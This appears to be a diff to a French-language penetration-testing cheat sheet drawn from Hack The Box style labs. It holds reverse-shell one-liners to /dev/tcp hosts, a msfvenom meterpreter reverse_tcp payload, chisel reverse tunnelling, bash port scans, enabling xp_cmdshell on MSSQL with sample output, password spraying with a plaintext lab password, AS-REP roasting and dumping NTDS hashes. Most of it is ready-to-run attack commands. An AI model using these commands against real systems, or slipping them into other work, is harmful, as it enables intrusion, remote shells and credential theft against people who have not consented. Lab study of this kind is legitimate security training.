@@ -34,6 +34,7 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 - `bash -i >& /dev/tcp/10.8.218.133/1234 0>&1` --> Elévation de privilèges
 
 - SSH Port Forwording --> `ssh sau@10.10.11.214 -L 8000:127.0.0.1:80` (attaquant --> 8000, victime --> 80)
+- Chisel port forwarding --> `chisel server -p 8888 --reverse` puis `chisel.exe client 10.10.16.9:8888 R:4444:127.0.0.1:4444`
 
 - WU CTF Mars@Hack --> https://gitlab.com/marshack/writeups/ctf_2024
 
@@ -110,10 +111,14 @@ john zip.hashes` ou `fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt secret_
 - Nslookup/dig
 - Enumération DNS --> `theHarvester -d mokoil.com -e 8.8.8.8 -c -n` ou `wfuzz -u http://artcorp.htb/ -H "Host: FUZZ.artcorp.htb" -w Downloads/subdomains-top1million-5000.txt --hh 0`
   
-
 - Table ARP
 
 ### Actif 
+
+- Depuis une machine Windows : 
+	- Voir les machines actives --> `for i in {1..254} ;do (ping 172.16.1.$i -c 1 -w 5  >/dev/null && echo "172.16.1.$i" &) ;done` ou ` 1..254 | % {"172.16.2.$($_): $(Test-Connection -count 1 -comp 172.16.2.$($_) -quiet)"}`
+   	- Voir les ports ouverts --> `for p in {1..65535}; do (echo >/dev/tcp/localhost/$p) >/dev/null 2>&1 && echo "$p open"; done`
+
 - Voir les ports ouverts --> `nmap -Pn 192.168.1.1`
 - Voir la version des services --> `nmap -sV -sC 192.168.1.1`
 - Voir tout les ports --> `sudo nmap -sS -p- 192.168.1.1`
@@ -123,7 +128,7 @@ john zip.hashes` ou `fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt secret_
 - Wordpress --> `wpscan --url www.mokoil.com`
 	- En mode agressif --> `wpscan --url www.mokoil.com -e vp,vt,u`
 	- Faire un brute-force sur les mots de passe --> `wpscan --url http://<target-IP>/ --passwords wordlist.txt --usernames victor`
-	- Brute force sur les plugins --> `wpscan --url http://10.10.110.119 --plugins-detection mixed -t 30`
+	- Brute force sur les plugins --> `wpscan --url http://10.10.110.119 --plugins-detection mixed -t 30 -e vp,vt,u`
 
 - [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
 - [PSpy](https://github.com/DominicBreuker/pspy)
@@ -254,6 +259,9 @@ Invoke-RestMethod -Uri $url -OutFile $dest`
 - Metasploit :
   	- Créer une librairie --> `msfconsole -p linux/x64/exec CMD=/bin/bash -f elf-so > shell.so`
   	- Créer une DLL --> `msfvenom -a x64 -p windows/x64/exec CMD="powershell -e XXX  -f dll -o rev.dll`
+  	- Créer un exe --> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.9 LPORT=4444 -f exe -o meterpreter_payload.exe`
+  	- Scanner une machine/réseau --> `use auxiliary/scanner/portscan/tcp`
+  	- Port Forwarding --> `portfwd add -L 127.0.0.1 -l 53 -p 53 -r 172.16.2.5`
 
  - Boite à outils RedTeam --> https://arttoolkit.github.io/
 
@@ -277,6 +285,8 @@ Invoke-RestMethod -Uri $url -OutFile $dest`
 
 - Simple file Locker --> Mettre un un mdp sur des fichiers/dossiers
 
+- Récupérer des fichiers en FTP passif : `wget -m --no-passive ftp://anonymous:anonymous@10.10.110.100`
+
 - Samba (connexion FTP like) --> `smbclient -L \\10.129.118.175`
   	- Connexion à un répertoire --> `smbclient -N \\\\10.129.197.116\\backups`
   	- Lister les répertoires avec des identifiants --> `crackmapexec smb 10.10.110.3 -u 'mrb3n' -p 'W3lc0me123!!!' --shares`
@@ -285,15 +295,24 @@ Invoke-RestMethod -Uri $url -OutFile $dest`
 
 
 - CrackMapExec (énumérer les politiques de sécurité AD) --> `crackmapexec smb $TARGET --pass-pol -u '' -p ''`
-  	- Password spraying (test des mots de passe sur plusieurs machines) --> `crackmapexec smb 10.10.110.0/24 -u 'mrb3n' -p 'W3lc0me123!!!'`
+  	- Password spraying (test des mots de passe sur plusieurs machines) --> `crackmapexec smb 10.10.110.0/24 -u 'mrb3n' -p 'W3lc0me123!!!'` ou `crackmapexec winrm 127.0.0.1 -u jbercov -p dante_password`
 
 - Utilisation de BloodHunt --> https://hackmd.io/Adw1ACZ_TJWMmDr1HIesqA?both#BloodHunt
 
 - Connexion à un serveur MSSQL Server Windows --> `impacket-mssqlclient ARCHETYPE/sql_svc@10.129.197.116 -windows-auth` ou `impacket-mssqlclient sa:x5Chuz8XbM@10.10.110.58`
+  	- Activer le `xp_cmdshell` : 
+```mssql=
+SQL (sophie  dbo@master)> EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
+[*] INFO(DANTE-SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (sophie  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+[*] INFO(DANTE-SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (sophie  dbo@master)> EXEC xp_cmdshell 'whoami';
+```
+  	  
 
 - RPC --> `rpcclient -U '%' 10.10.10.161`
 
-- Obtenir les hash utilisateur --> `impacket-GetNPUsers htb.local/ -dc-ip 10.129.118.175 -request`
+- Obtenir les hash utilisateur --> `impacket-GetNPUsers htb.local/ -dc-ip 10.129.118.175 -request` ou `python GetNPUsers.py dante/jbercov -no-pass -dc-ip 127.0.0.1`
 
 - Depuis un dump de fichier obtenir les hash --> `impacket-secretsdump local -system registry/SYSTEM -ntds Active\ Directory/ntds.dit`
 
